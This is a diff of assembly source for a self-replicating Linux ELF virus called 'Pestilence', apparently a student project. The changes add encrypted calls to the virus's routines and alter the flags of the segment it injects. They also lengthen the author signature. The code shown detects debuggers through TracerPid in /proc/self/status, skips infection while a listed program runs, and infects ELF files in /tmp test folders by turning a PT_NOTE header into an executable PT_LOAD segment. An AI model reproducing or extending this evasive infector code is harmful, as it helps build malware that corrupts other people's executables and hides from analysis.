@@ -12,7 +12,7 @@ section .text
 
 ; ----------------------------------------- routines -------------------------------------------------------------------
 
-    directory_name_isdigit:
+    __F_directory_name_isdigit:
         ; rdi = puntero dirent_buffert
         push rbx
         lea rsi, [rdi + dirent.d_name]
@@ -31,9 +31,9 @@ section .text
             mov al, bl
             pop rbx
         ret
-        .directory_name_isdigit_end:
+    __F_directory_name_isdigit__end:
 
-    close_proc_dir:
+    __F_close_proc_dir:
         push rax
         push rdi
         mov rax, SC_CLOSE
@@ -42,6 +42,7 @@ section .text
         pop rdi
         pop rax
         ret
+    __F_close_proc_dir__end:
 
     close_status_file:
         push rax
@@ -110,7 +111,7 @@ section .text
         jne .check_dir_in_proc
 
         ; comprobamos que el nombre del directorio se corresponde con un PID
-        CALL directory_name_isdigit, 0x20
+        CALL_ENCRYPT (directory_name_isdigit)
         cmp al, 0
 
         jne .check_dir_in_proc
@@ -185,7 +186,7 @@ section .text
         jmp .cleanup_and_check_dir_in_proc
 
     .cleanup_and_jump_to_host_0:
-        call close_proc_dir
+        CALL_ENCRYPT (close_proc_dir)
         add rsp, 256
         jmp .jump_to_host
 
@@ -195,7 +196,7 @@ section .text
 
     .check_tracerpid:
         ; abrimos /proc/self/status
-        call close_proc_dir
+        CALL_ENCRYPT (close_proc_dir)
         lea rdi, [rel status_file]
         mov rsi, O_RDONLY
         mov rax, SC_OPEN
@@ -246,7 +247,6 @@ section .text
     .cleanup_and_jump_to_host_1:
         add rsp, 0x1000
         call close_status_file
-        TRACE_TEXT hello, 11
         jmp .jump_to_host
 
     .check_tracerPid_value:
@@ -259,7 +259,7 @@ section .text
 
     .start_infection:
         ;load dirs
-        call close_proc_dir
+        CALL_ENCRYPT (close_proc_dir)
         lea rdi, [dirs]
 
 ; ----------------------------------------- VIRUS -------------------------------------------------------------------
@@ -412,7 +412,7 @@ section .text
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
-        mov rcx, 20
+        mov rcx, 54
         cld                 ; incremental
         rep cmpsb           ; comparar rdi y rsi rcx bytes
         je .munmap
@@ -485,8 +485,8 @@ section .text
         lea rax, VAR(Pestilence.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        mov [rax+Elf64_Phdr.p_flags], 0x07               
-       ; mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R
+        mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
+       ; mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
         mov ecx, dword VAR(Pestilence.file_final_len)
         sub ecx, dword VAR(Pestilence.virus_size)
         mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
@@ -574,7 +574,6 @@ section .text
         syscall
 
     tracerPid_str   db      "TracerPid:",0x9 ; 11
-    ; tracerPid_str   db      "Name:" ; 5
     status_file     db      "/proc/self/status",0 ; 18
     xor_pass        db      "p3st1l3!" ; 8
     forbidden_prog  db      "/vim",0 ; 4
@@ -583,7 +582,7 @@ section .text
     proc            db      "/proc/",0 ; 7
     dirs            db      "/tmp/test",0,"/tmp/test2",0,0
     Traza_position  equ     _finish - Traza
-    Traza           db      "tomartin & carce-bo",0  ;20
+    Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo",0  ;54
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
